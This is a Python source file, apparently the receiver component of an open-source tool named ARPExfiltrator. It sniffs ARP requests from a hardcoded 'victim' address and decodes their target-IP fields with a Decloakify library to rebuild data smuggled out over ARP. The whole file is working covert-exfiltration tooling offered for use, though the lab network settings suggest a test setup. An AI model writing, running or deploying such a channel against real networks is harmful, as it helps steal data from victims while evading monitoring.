#!/usr/bin/env python3
# coding: utf-8

"""receiver.py
This file is part of ARPExfiltrator.
ARPExfiltrator is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
ARPExfiltrator is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with ARPExfiltrator.  If not, see <http://www.gnu.org/licenses/>.
"""

from __future__ import print_function
from scapy.all import *
import time
from libs.decloakify import Decloakify

__VERSION__ = "0.0.1"
__AUTHOR__ = "Antonio Blescia"
__AUTHOR_EMAIL__ = "a.blescia@nocommentlab.it"

__ARP_OP_CODE__ = 0x01 # ARP Request Operation Code
__VICTIM_IPV4_ADDRESS__ = "192.168.56.113"
__NETWORK_INTERFACE__ = "vboxnet0"

str_buffer = ""

def handle_arp_packet(packet):
    """
    Recompose the payload by buffering each received ARP request
    :param: packet: Received packet that satisfy the BPF filter
    """
    global str_buffer

    if packet[ARP].op == __ARP_OP_CODE__:
        str_buffer = Decloakify(packet[ARP].pdst, './libs/ipAddresses')
        if str_buffer is not None:
            print(str_buffer)
            str_buffer = ""
    return

if __name__ == "__main__":
    """
    Main function that registers the scapy receiver packet handler
    """
    sniff(filter="arp src {} and arp[6:2] = 1".format(__VICTIM_IPV4_ADDRESS__), 
            iface=__NETWORK_INTERFACE__, 
            prn=handle_arp_packet)